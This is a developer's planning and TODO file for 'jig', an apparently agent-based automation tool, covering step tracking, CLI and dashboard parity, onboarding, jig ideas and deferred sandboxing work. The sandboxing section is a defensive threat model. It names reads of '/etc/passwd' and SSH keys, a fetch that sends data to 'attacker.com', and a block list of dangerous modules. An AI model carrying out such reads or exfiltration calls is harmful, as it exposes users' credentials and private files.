# Steps Simplification

## Done
- [x] Runtime auto-stepping: agent(), llm(), direct tool calls auto-create steps
- [x] Step scan mode: runs handler with stubs to derive steps without execution
- [x] Humanize labels via minimax, cache by code hash in step_cache table
- [x] Live step tracking in server runProgress, returned in poll response
- [x] Dashboard simplified: idle=scanned steps, running/done=live steps
- [x] Deleted: deriveSteps LLM, jig_steps/jig_meta tables, recompile endpoint, derive-steps CLI command

## TODO
- [ ] **System notifications** — alert user on jig failures/important events via MCP notification server, Resend (email), or Twilio (SMS). Pluggable sink chosen in settings.
- [ ] **Concurrent run pipeline hardening** — all runs (manual, scheduled, webhook) must go through the same run-store tracking. Verify no race conditions in per-jig startTrackedRun/finishTrackedRun. Ensure persist() and applyRunEvent() are safe across concurrent jigs. Test: two jigs running simultaneously, one fails mid-run while other succeeds.
- [ ] **CLI ↔ dashboard UI parity** — CLI `runJigFile` ignores step-start/step-done events; should render them through JigIO. `jig run` (no args) should list jigs with their derived steps. Both surfaces must show the same step progression, tool chips, and outputs.
- [ ] **CLI self-update flow** — when running the `jig` CLI, check whether a newer version is available and offer/apply a self-update path compatible with global installs via `npm i -g`.
- [ ] **Onboarding from blank slate** — first-run experience: no jigs, no connections. Guide through connecting first service (Composio OAuth), accepting ToS, creating first jig. Plus: "Reset data" button in settings that wipes credentials/runs/jigs and returns to onboarding.
- [ ] **"Add new jig" flow works end-to-end** — verify the dashboard "new jig" button creates a working jig from a prompt, types check, derives steps, and runs. Currently unclear if jig-gen prompt + save + derive + first-run all chain cleanly.
- [ ] **Dashboard data fetching cleanup** — use `swr` for dashboard read/query state (jig detail, runs, connection status, tool approval state) where it improves cache + revalidation behavior, but keep imperative command flows like start agent session / send agent message / run actions on direct fetch-style calls.
- [ ] **Step tool param previews in the dashboard** — for authoring-discovery-backed jigs, show a concise generic preview of resolved MCP call params in step tool chips/tooltips (e.g. Apify actor name), but implement it generically from derived source/tool call metadata rather than special-casing Apify in the UI.
- [ ] **`ctx.human()` support** — if human-in-the-loop approval returns, implement it as a real current runtime/API feature with matching dashboard/backend flow; do not rely on the old product spec alone.
- [ ] **Advanced runtime helpers** — evaluate and implement only if they fit the real runtime model: `ctx.parallel()`, `ctx.map()`, `ctx.state`, `ctx.secret()`, and `ctx.run()`. Keep docs/specs aligned with actual support instead of assuming these exist.
- [ ] **Tagging jigs** — let users assign tags/labels to jigs (e.g. "work", "personal", "experimental") and filter the dashboard list by tag. Tags stored in jig file metadata or DB.
- [ ] Per-jig model override
  - Dashboard has a disabled model dropdown in jig detail pane — wire it up
  - Add `model` field to JigDefinition options (optional override)
  - Search dropdown: fetch available models from OpenRouter /api/v1/models, filter by tool support
  - Store selection in jig file's `jig()` options: `{ model: "google/gemini-3-flash-preview" }`
  - Pass to `agent()` and `llm()` calls at runtime via ctx or options
  - UI: enable the select, add search/filter, show price per model
- [ ] CLI step display parity with dashboard
  - CLI `runJigFile` receives RunEvents but ignores step-start/step-done — should render them
  - CLI `jig run` (no args) lists jigs without steps — could show derived steps per jig
  - Both should go through JigIO so rendering is abstracted (CLI prints text, dashboard renders components)
  - Add step events to JigEvent union type so `io.emit()` can carry them
  - CLI renderEvent should handle step-start (print label + spinner) and step-done (print status + duration)


## Edge Cases to Think About
- **Scan crash truncation**: if handler destructures a stub return (`result.email`), scan crashes before later steps. Works for weekly-update (destructure→tool call still runs), but deep chaining could truncate. Could mitigate with Proxy objects that return more Proxies, or accept that scan shows "at least these steps".
- **Conditional steps invisible to scan**: `if (params.mode === "full") await tool1() else await tool2()` — scan passes empty params so always takes falsy branch. Could run scan multiple times with different param combos, but complexity explodes.
- **Top-level side effects on import**: scan imports the jig module, triggering `await Bun.file("template.md").text()` etc. Usually fast/harmless but could fail if template files are missing or if module has expensive top-level work.
- **First-load storm**: `handleGetJigs()` calls `buildJigResponse()` for ALL jigs. First ever request with empty cache = N module imports + N scans + N minimax calls. Could be slow with many jigs. Options: lazy-derive only on detail view, background derive on startup, or accept cold-start cost since it's cached after.
- **Nested agent() calls**: inner `agent()` creates a new step inside the outer agent's step. `_inAgent` stays true so tool calls inside inner agent don't sub-step. But the outer step gets finalized early. Probably fine in practice — nested agents are rare.
- **ctx.parallel() with multiple tool calls**: parallel tool calls each try to create a step. Steps are sequential (ctx.step finalizes previous), so parallel calls would create rapid step churn. May want to batch parallel direct tool calls into one step, or only auto-step the first in a parallel batch.
- **Scan + humanize for grouped jigs**: each entity is a separate file with separate handler. buildJigResponse only scans the first entity — other entities get same steps shown. Fine if entities share structure, wrong if they diverge.

## Jig Ideas

- [ ] **Trending digest email** — daily/weekly email with trending GitHub repos + best Hacker News posts
- [ ] **SEO Search Console update** — pull Google Search Console data, surface what to fix (drops, errors, opportunities)
- [ ] **Daily question** — given user's current state/context, generate a thought-provoking daily question
- [ ] **Statement review inbox** — webhook jig triggered by an email that asks "please review" with a PDF/image attachment. Classifies as company vs personal financial statement, OCRs the file, scans for things to remove/question (duplicate charges, unusual merchants, subscriptions, missing line items), and replies to the email with the annotated review.

## Onboarding & Integrations

- [ ] **Onboarding flow** — first-run experience for jig: guide users through connecting services (Composio, Gmail, etc.) and accepting terms of service. Should show clear setup steps, handle OAuth flows, track acceptance.
- [ ] **Use `skills.sh/official` for integration context** — evaluate `https://skills.sh/official` as an additional source of truth during connection authoring/discovery so Jig can pull better tool descriptions, auth/setup guidance, and service capability context when generating or editing jigs.
- [ ] **Evaluate Composio alternatives** — research Nango (nango.dev, OSS self-hostable, no inbound triggers), Metorial (metorial.com), Pipedream (trigger ecosystem, multi-tenant auth). Check if they fit the proxy pattern (meta-tool + discover), pricing for personal use, privacy/SOC2, auth model, stdio vs remote MCP, inbound webhooks, self-hosting. Add second-source integration platforms to servers.json alongside composio.

## Jig Sandboxing (deferred)

Current state: jigs can only import `@jig/sdk` and `@jig/connections/*`. The `jig/*` wildcard alias is gone. Relative imports are rejected by the validator. OAuth credentials in the SQLite `credentials` table are no longer reachable via `import { getCredential } from "jig/db"` — that module path no longer exists.

Still unrestricted (in-process runner):

- [ ] **Block dangerous node/bun modules** — validator should reject `node:fs`, `node:child_process`, `bun:sqlite`, `node:worker_threads`. Jigs have no legitimate need for raw filesystem or subprocess access.
- [ ] **Block dynamic `import()`, `eval()`, `Function()`** — static analysis bypass vectors. Reject at validator time.
- [ ] **Filesystem read isolation** — jigs can still call `Bun.file("/etc/passwd").text()` or `readFileSync("~/.ssh/id_rsa")`. Needs OS-level sandbox.
- [ ] **Network exfil** — jigs can still `fetch("https://attacker.com", { body })`. Needs network allow-list.
- [ ] **Subprocess sandbox** — run each jig in a subprocess wrapped with `sandbox-exec` (macOS) or `bubblewrap` (Linux). Parent brokers LLM/MCP calls via Unix socket. Kernel-enforced, battle-tested via Anthropic's Claude Code (`@anthropic-ai/sandbox-runtime`).
  - macOS: `sandbox-exec -f profile.sb bun run child.ts` — ~50ms overhead, kernel-enforced via TrustedBSD
  - Linux: `bwrap --unshare-net --ro-bind / / --tmpfs /tmp --bind <socket> <socket> bun run child.ts` — AF_UNIX sockets pass through `--unshare-net` via mount namespace
  - Requires: IPC protocol over Unix socket, cross-platform wrapper detection, bwrap install hint on Linux (Ubuntu 24.04 needs apparmor sysctl fix)
  - Typegen needs a parallel `.jig/connections-sandbox/` variant that routes tool calls via IPC instead of direct `src/mcp/client.ts` imports
  - ~150–500 LOC depending on IPC protocol choice
- [ ] **CPU/memory limits** on child processes (`ulimit` on Unix, `taskpolicy` on macOS)
